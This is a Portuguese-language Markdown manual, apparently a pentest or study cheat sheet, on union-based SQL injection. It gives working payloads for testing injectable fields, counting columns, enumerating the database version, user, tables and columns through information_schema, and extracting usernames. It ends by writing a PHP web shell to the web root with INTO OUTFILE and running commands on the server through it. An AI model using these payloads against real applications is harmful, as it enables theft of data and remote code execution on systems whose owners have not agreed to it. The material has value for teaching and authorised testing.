# 💉 SQL Injection Manual
---

## 🔎 Identificando um possível SQL Injection

Quando um campo da aplicação:

* Recebe input do usuário (ex: busca, login)
* E o resultado muda conforme o que é digitado

➡️ Existe chance de estar interagindo diretamente com o banco de dados.

---

## 🎯 Objetivo do SQL Injection

Manipular a query original do backend para:

* Alterar o comportamento da aplicação
* Extrair dados sensíveis

---

## 🧪 Teste inicial de vulnerabilidade

```sql
' OR 1=1#
```

### 📌 Explicação:

* `'` → fecha a string original
* `OR 1=1` → sempre verdadeiro
* `#` → comenta o restante da query

✅ Se retornar dados → **possivelmente vulnerável**

---

## 📊 Descobrindo o número de colunas

Usamos:

```sql
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

### 📌 Estratégia:

* Incrementar o número até quebrar
* Quando der erro → coluna não existe

✅ O último número válido = quantidade de colunas

---

## 🔗 Unindo queries (UNION)

O `UNION` permite juntar dois `SELECTs`

```sql
' UNION SELECT 1,2,3,4#
```

### ⚠️ Regra importante:

* Ambos os SELECTs devem ter **mesmo número de colunas**

---

## 🔍 Identificando colunas visíveis

```sql
' UNION SELECT 1,2,3,4#
```

### 📌 O que acontece:

* Os números aparecem na tela
* Cada número indica uma coluna visível

✅ Use apenas colunas visíveis para exfiltração

---

## 🧠 Entendendo o SELECT

### 📌 Com colunas reais:

```sql
SELECT nome, idade FROM usuarios;
```

### 📌 Com valores literais:

```sql
SELECT 1,2,3,4;
```

➡️ Cria uma linha temporária com esses valores

---

## 💰 Coletando informações do banco

Depois de identificar colunas visíveis:

### 🔧 Exemplos:

```sql
' UNION SELECT 1,@@version,3,4#
' UNION SELECT 1,database(),3,4#
' UNION SELECT 1,user(),3,4#
```

### 📌 Funções úteis:

* `@@version` → versão do banco
* `database()` → nome do DB
* `user()` → usuário atual

---

## 🗂️ Enumerando tabelas

```sql
' UNION SELECT 1,table_name,3,4 
FROM information_schema.tables 
WHERE table_schema = 'nome_db'#
```

### 📌 Conceitos:

* `information_schema.tables` → lista TODAS as tabelas
* `table_schema` → filtra por database

---

## ⚠️ Observação por banco:

| Banco  | Alternativa              |
| ------ | ------------------------ |
| MySQL  | information_schema       |
| Oracle | all_tables / user_tables |
| SQLite | sqlite_master            |

---

## 🧾 Descobrindo colunas

```sql
' UNION SELECT 1,column_name,3,4 
FROM information_schema.columns 
WHERE table_name = 'nome_tabela'#
```

### 📌 Retorna:

* Nome de todas as colunas da tabela

---

## 📦 Extraindo dados

```sql
' UNION SELECT 1,username,3,4 FROM usuarios#
```

➡️ Substitua pelo nome das colunas descobertas

---

# ⚠️ SQL Injection para WebShell (RCE)

## 🎯 Objetivo:

Escrever um arquivo no servidor com código malicioso

---

## 💾 Usando INTO OUTFILE

```sql
SELECT @@version INTO OUTFILE '/caminho/arquivo.txt'
```

### 📌 Importante:

* Cria arquivos (não sobrescreve)
* Precisa de permissão no servidor

---

## 🐚 Criando WebShell em PHP

```sql
' UNION SELECT 1,2,3,"<?php system($_GET[0]) ?>" 
INTO OUTFILE '/var/www/html/shell.php'#
```

### 📌 O que acontece:

* O banco salva o conteúdo no arquivo
* O servidor interpreta como PHP

---

## 🌐 Executando comandos

Acessando:

```
http://alvo/shell.php?0=ls -la
```

### 📌 Exemplos:

```bash
?0=ls -la
?0=pwd
?0=cd ..; ls
?0=ls -la /
```

---
